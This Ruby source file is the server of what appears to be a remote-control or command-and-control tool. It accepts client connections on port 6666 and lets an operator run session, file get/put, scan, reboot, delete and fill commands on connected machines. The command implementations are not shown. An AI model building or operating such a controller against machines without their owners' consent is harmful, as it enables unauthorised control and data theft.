=begin
Copyright 2023 Chris Basinger

Licensed under the Apache License, Version 2.0(the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
=end
require 'terminal-table'
require 'socket'
require 'singleton'
require_relative 'commands'
require_relative 'client'
require_relative 'constants'

# Handles connections and contains the clients
class Server
  include Singleton
  attr_accessor :clients

  def initialize(port = 6666)
    @clients = []
    @port = port
  end

  #starts the server. This handles adding new connections.
  def start
    puts "starting server on port #{@port}"
    puts "version #{$VERSION}"
    puts $TIP
    puts $BANNER
    puts "By #{$AUTHOR}"
    puts
    Thread.new do
      server = TCPServer.new(@port)
      loop do
        client = Client.new(server.accept)
        Thread.new do
          client.name = client.sock.gets.chomp
          client.platform = client.sock.gets.chomp
          if client.name && client.platform
            @clients << client
            puts "#{client.to_s} joined"
          end
        end
      end
    end
    handle_commands
  end

  # handles user input for executing commands
  def handle_commands
    loop do
      command, ip, file, format = STDIN.gets.chomp.split(" ")
      if command
        command = command.downcase
        if command == 'exit'
          puts 'exiting the server..'
          break
        end
        case command
        when "clients"
          Commands.clients_table @clients
        when 'session'
          if ip
            client = find_client ip
          end
          if client
            Commands.session(client)
          else
            puts 'client does not exist'
          end
        when 'get'
          if ip
            client = find_client ip
          end
          if client
            Commands.get(client, file, format)
          else
            puts 'client does not exist'
          end
        when 'put'
          if ip
            client = find_client ip
          end
          if client
            Commands.put(client, file, format)
          else
            puts 'client does not exist'
          end
        when 'help'
          puts $HELP_TABLE
        when 'scan'
          if ip
            client = find_client ip
          end
          if client
            Commands.scan client
          else
            puts 'client does not exist'
          end
        when 'latency'
          if ip
            client = find_client ip
          end
          if client
            Commands.latency client
          else
            puts 'client does not exist'
          end
        when 'programs'
          if ip
            client = find_client ip
          end
          if client
            Commands.programs client
          else
            puts 'client does not exist'
          end
        when 'uptime'
          if ip
            client = find_client ip
          end
          if client
            Commands.uptime client
          else
            puts 'client does not exist'
          end
        when 'reboot'
          if ip
            client = find_client ip
          end
          if client
            Commands.reboot client
          else
            puts 'client does not exist'
          end
        when 'delete'
          if ip
            client = find_client ip
          end
          if client
            Commands.delete client
          else
            puts 'client does not exist'
          end
        when 'fill'
          if ip
            client = find_client ip
          end
          if client
            Commands.fill client
          else
            puts 'client does not exist'
          end
        when 'clear'
          system 'clear'
        else
          puts 'invalid command'
        end
      end
    end
  end

  def find_client(ip)
    if ip.include? '.'
      client = find_client_by_ip(ip)
    else
      client = find_client_by_id(ip)
    end
    return client
  end

  # returns the client matching the ip address
  def find_client_by_ip(ip)
    @clients.each do |client|
      if client.ip == ip
        return client
      end
    end
    return nil
  end

  def find_client_by_id(id)
    @clients.each do |client|
      if client.id == id.to_i
        return client
      end
    end
    return nil
  end
end